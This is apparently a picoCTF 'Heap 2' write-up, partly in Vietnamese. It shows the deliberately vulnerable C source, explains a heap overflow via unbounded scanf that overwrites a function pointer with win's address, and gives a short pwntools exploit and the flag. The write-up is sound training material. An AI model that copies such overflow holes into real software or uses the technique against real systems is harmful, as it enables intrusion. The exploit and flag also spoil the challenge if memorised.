## Heap 2
Can you handle function pointers?

Download the binary here.

Download the source here.

Additional details will be available after launching your challenge instance.

## Solution
#### Source code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

* Dựa vào source, ta có thể dùng buffer overflow để ghi đè lên biến `input_data`. Bây giờ việc cần phải làm là xác định được số ký tư để đè và địa chỉ của hàm win để đưa vào cuối chuỗi buffer.
* `void check_win() { ((void (*)())*(int*)x)(); }` khi truyền vào x một địa chỉ hàm thì nó sẽ thực thi luôn hàm đó, vậy ta cần ghi đè địa chỉ hàm `win` lên biến x.
* Chạy file binary và thử in Heap:
```
I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x17776b0  ->   pico
+-------------+-----------+
[*]   0x17776d0  ->   bico
```
* Vậy 0x17776b0 là địa chỉ của `input_data` và 0x17776d0 là địa chỉ của `x` => 2 biến cách nhau 32 bytes.
* Lấy đựa địa chỉ hàm win là `0x00000000004011a0`.

Đây là file exploit:
```
from pwn import *

p = remote('mimas.picoctf.net', 60033)

p.sendline(b'2')
p.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x11\x40\x00\x00\x00\x00\x00')
p.sendline(b'4')

print(p.recvall())
```

Thu được flag: `picoCTF{and_down_the_road_we_go_dbb7ff66}`